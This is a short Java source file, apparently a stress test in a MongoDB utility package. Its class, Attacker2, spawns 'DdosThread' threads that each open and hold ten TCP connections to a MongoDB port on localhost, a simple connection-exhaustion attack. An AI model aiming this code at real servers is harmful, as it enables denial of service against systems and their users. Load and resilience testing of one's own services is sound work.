package com.mongodb.util;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker2 {
    
    
 
    public static void main(String... args) throws Exception {
        
//        MongoClientURI uri = new MongoClientURI(args[0]);
        int threads = Integer.parseInt(args[1]);
        for (int i = 0; i < threads; i++) {
            DdosThread thread = new DdosThread(10);
            thread.start();
        } 
    } 
 
    public static class DdosThread extends Thread {
 
        private AtomicBoolean running = new AtomicBoolean(true);
        private int numSockets;
        private Socket[] sockets;
        private String host = "localhost";
        private int port = 27017;
 
        public DdosThread(int numSockets) throws Exception {
            this.numSockets = numSockets;
            sockets = new Socket[numSockets];
        } 
 
 
        @Override 
        public void run() { 
            //while (running.get()) {
                try { 
                    attack(); 
                } catch (Exception e) {
 
                } 
 
 
            //} 
        } 
 
        public void attack() {
            for (int i = 0; i < numSockets; i++) {
                try {
                    //Socket socket = new Socket("localhost", 27017);
                    Socket socket = new Socket();
                    socket.setTcpNoDelay(true);
                    socket.setKeepAlive(true);
                    socket.connect(new InetSocketAddress(InetAddress.getByName(host), port));
                    OutputStream os = socket.getOutputStream();
                    InputStream is = socket.getInputStream();
                    sockets[i] = socket;
                } catch (Exception e) {
                    e.printStackTrace();
                }
                
            }
        } 
    } 
 
} 